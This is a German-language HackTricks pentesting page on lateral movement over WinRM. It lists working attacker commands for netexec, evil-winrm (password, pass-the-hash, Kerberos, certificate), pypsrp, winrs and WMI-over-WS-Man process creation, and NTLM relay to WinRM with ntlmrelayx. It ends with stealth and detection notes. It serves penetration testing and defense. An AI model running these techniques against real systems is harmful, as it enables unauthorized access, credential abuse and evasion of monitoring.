# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM ist eines der bequemsten **lateral movement**-Transporte in Windows-Umgebungen, weil es dir eine Remote Shell über **WS-Man/HTTP(S)** gibt, ohne SMB-Service-Erstellungstricks zu benötigen. Wenn das Ziel **5985/5986** exponiert und dein Principal berechtigt ist, Remoting zu verwenden, kannst du oft sehr schnell von „gültige Creds“ zu „interaktive Shell“ wechseln.

Für die **protocol/service enumeration**, Listener, das Aktivieren von WinRM, `Invoke-Command` und die generische Client-Nutzung, siehe:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Nutzt **HTTP/HTTPS** statt SMB/RPC, daher funktioniert es oft dort, wo PsExec-style execution blockiert ist.
- Mit **Kerberos** werden keine wiederverwendbaren Credentials an das Ziel gesendet.
- Funktioniert sauber von **Windows**, **Linux** und **Python**-Tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Der interaktive PowerShell-Remoting-Pfad startet **`wsmprovhost.exe`** auf dem Ziel im Kontext des authentifizierten Benutzers, was operativ anders ist als service-based exec.

## Access model and prerequisites

In der Praxis hängt erfolgreiches WinRM lateral movement von **drei** Dingen ab:

1. Das Ziel hat einen **WinRM listener** (`5985`/`5986`) und Firewall-Regeln, die Zugriff erlauben.
2. Das Konto kann sich am Endpoint **authentifizieren**.
3. Das Konto darf eine **remoting session** öffnen.

Häufige Wege, diesen Zugriff zu bekommen:

- **Local Administrator** auf dem Ziel.
- Mitgliedschaft in **Remote Management Users** auf neueren Systemen oder **WinRMRemoteWMIUsers__** auf Systemen/Komponenten, die diese Gruppe noch berücksichtigen.
- Explizite Remoting-Rechte, die über lokale Security Descriptors / PowerShell-remoting-ACL-Änderungen delegiert wurden.

Wenn du bereits eine Box mit Admin-Rechten kontrollierst, denk daran, dass du WinRM-Zugriff auch **ohne vollständige Admin-Gruppenmitgliedschaft** delegieren kannst, indem du die hier beschriebenen Techniken verwendest:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos erfordert einen hostname/FQDN**. Wenn du dich per IP verbindest, fällt der Client normalerweise auf **NTLM/Negotiate** zurück.
- In **workgroup**- oder Cross-Trust-Sonderfällen benötigt NTLM oft entweder **HTTPS** oder das Hinzufügen des Ziels zu **TrustedHosts** auf dem Client.
- Bei **local accounts** über Negotiate in einer Workgroup können UAC-Remote-Restriktionen den Zugriff verhindern, außer es wird das integrierte Administrator-Konto verwendet oder `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting verwendet standardmäßig den **`HTTP/<host>` SPN**. In Umgebungen, in denen **`HTTP/<host>`** bereits einem anderen Servicekonto zugewiesen ist, kann WinRM Kerberos mit `0x80090322` fehlschlagen; verwende einen Port-qualifizierten SPN oder wechsle zu **`WSMAN/<host>`**, falls dieser SPN existiert.

Wenn du bei Password Spraying gültige Credentials findest, ist das Validieren über WinRM oft der schnellste Weg, um zu prüfen, ob daraus eine Shell wird:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec für Validierung und One-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM für interaktive Shells

`evil-winrm` bleibt die bequemste interaktive Option von Linux aus, da es **Passwörter**, **NT hashes**, **Kerberos tickets**, **client certificates**, Dateiübertragung und In-Memory-Loading von PowerShell/.NET unterstützt.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos-SPN-Sonderfall: `HTTP` vs `WSMAN`

Wenn das standardmäßige **`HTTP/<host>`**-SPN Kerberos-Fehler verursacht, versuche stattdessen, ein **`WSMAN/<host>`**-Ticket anzufordern/zu verwenden. Das tritt in gehärteten oder ungewöhnlichen Enterprise-Setups auf, in denen **`HTTP/<host>`** bereits an ein anderes Service-Account gebunden ist.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Das ist auch nach **RBCD / S4U**-Missbrauch nützlich, wenn du speziell ein **WSMAN**-Service-Ticket gefälscht oder angefordert hast statt eines generischen `HTTP`-Tickets.

### Certificate-based authentication

WinRM unterstützt auch **client certificate authentication**, aber das certificate muss auf dem Ziel auf ein **local account** gemappt werden. Aus offensiver Sicht ist das relevant, wenn:

- du bereits ein gültiges client certificate und einen privaten key gestohlen/exportiert hast, die für WinRM gemappt sind;
- du **AD CS / Pass-the-Certificate** missbraucht hast, um ein certificate für einen principal zu erhalten und dann in einen anderen authentication path zu pivoten;
- du in Umgebungen arbeitest, die bewusst password-based remoting vermeiden.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM ist viel seltener als password/hash/Kerberos auth, aber wenn sie existiert, kann sie einen **passwordless lateral movement**-Pfad bieten, der Password-Rotation überlebt.

### Python / automation with `pypsrp`

Wenn du Automatisierung statt einer operator shell brauchst, bietet dir `pypsrp` WinRM/PSRP aus Python mit **NTLM**, **certificate auth**, **Kerberos** und **CredSSP**-Support.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` ist integriert und nützlich, wenn du **native WinRM-Befehlsausführung** ohne das Öffnen einer interaktiven PowerShell-Remoting-Sitzung möchtest:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Operational gesehen führt `winrs.exe` häufig zu einer Remote-Prozesskette ähnlich wie:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Das ist es wert, sich zu merken, weil es sich von service-based exec und von interaktiven PSRP-Sessions unterscheidet.

### `winrm.cmd` / WS-Man COM statt PowerShell remoting

Du kannst auch über **WinRM transport** ohne `Enter-PSSession` ausführen, indem du WMI-Klassen über WS-Man aufrufst. Dadurch bleibt der Transport WinRM, während die Remote-Execution-Primitive zu **WMI `Win32_Process.Create`** wird:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Dieser Ansatz ist nützlich, wenn:

- PowerShell-Logging stark überwacht wird.
- Du **WinRM transport** willst, aber keinen klassischen PS remoting workflow.
- Du eigene Tools rund um das **`WSMan.Automation`**-COM-Objekt entwickelst oder nutzt.

## NTLM relay to WinRM (WS-Man)

Wenn SMB relay durch signing blockiert ist und LDAP relay eingeschränkt ist, kann **WS-Man/WinRM** dennoch ein attraktives relay target sein. Moderne `ntlmrelayx.py`-Versionen enthalten **WinRM relay servers** und können an **`wsman://`**- oder **`winrms://`**-Targets relayn.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Zwei praktische Hinweise:

- Relay ist am nützlichsten, wenn das Ziel **NTLM** akzeptiert und der relayed principal WinRM verwenden darf.
- Neuerer Impacket-Code behandelt speziell **`WSMANIDENTIFY: unauthenticated`**-Requests, sodass **`Test-WSMan`**-ähnliche Probes den Relay-Flow nicht unterbrechen.

Für Multi-Hop-Einschränkungen nach dem Erhalt einer ersten WinRM-Session siehe:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC- und Detection-Hinweise

- **Interaktives PowerShell remoting** erzeugt auf dem Ziel normalerweise **`wsmprovhost.exe`**.
- **`winrs.exe`** erzeugt üblicherweise **`winrshost.exe`** und danach den angeforderten Child Process.
- Rechne mit **network logon**-Telemetrie, WinRM-Service-Events und PowerShell Operational-/Script-Block-Logging, wenn du PSRP statt rohem `cmd.exe` verwendest.
- Wenn du nur einen einzelnen Befehl brauchst, kann `winrs.exe` oder eine einmalige WinRM-Ausführung unauffälliger sein als eine langlaufende interaktive remoting-Session.
- Wenn Kerberos verfügbar ist, bevorzuge **FQDN + Kerberos** gegenüber IP + NTLM, um sowohl Trust-Probleme als auch umständliche clientseitige `TrustedHosts`-Änderungen zu reduzieren.

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
